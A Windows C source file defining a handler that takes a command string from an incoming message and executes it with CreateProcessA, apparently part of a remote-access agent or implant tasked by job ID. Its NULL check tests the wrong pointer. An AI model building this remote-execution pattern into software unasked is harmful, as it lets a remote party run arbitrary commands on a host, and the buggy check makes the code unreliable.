#include "commands.h"
#include "debug.h"

/*
@brief Function that executes a command
@param PMESSAGE containts the parameters for the command
@param PMESSAGE is a pointer to the result that will be sent back
@return ERROR_T with status of dir
*/
ERROR_T ExecuteCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;
    PDWORD pRemoteCmdLen = NULL;
    PCHAR pRemoteCmd = NULL;
    STARTUPINFOA startup_info = {0};
    PROCESS_INFORMATION process_info = {0};
	PBYTE pBuf = NULL;

    DWORD dwAllocSize = 0;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    pRemoteCmdLen = (PDWORD) pMsg->pData;
    pRemoteCmd = (PCHAR) ((PBYTE) pMsg->pData + sizeof(DWORD));

    DBG_PRINT("Executing: %s:%d\n", pRemoteCmd, *pRemoteCmdLen);

	iError = CreateProcessA(NULL, pRemoteCmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL,  &startup_info, &process_info);
    if (0 == iError){
        DBG_PRINT("%d\n", GetLastError());
        iError = E_EXECUTE_ERROR;
        goto end;
    }

    iError = E_SUCCESS;

end:
    (*pResult)->hdr.dwCommand = pMsg->hdr.dwCommand;
    (*pResult)->hdr.dwJobID = pMsg->hdr.dwJobID;
    (*pResult)->hdr.dwMessageSize = sizeof(MESSAGE_HEADER);
    (*pResult)->hdr.dwResultCode = iError;

    return iError;


}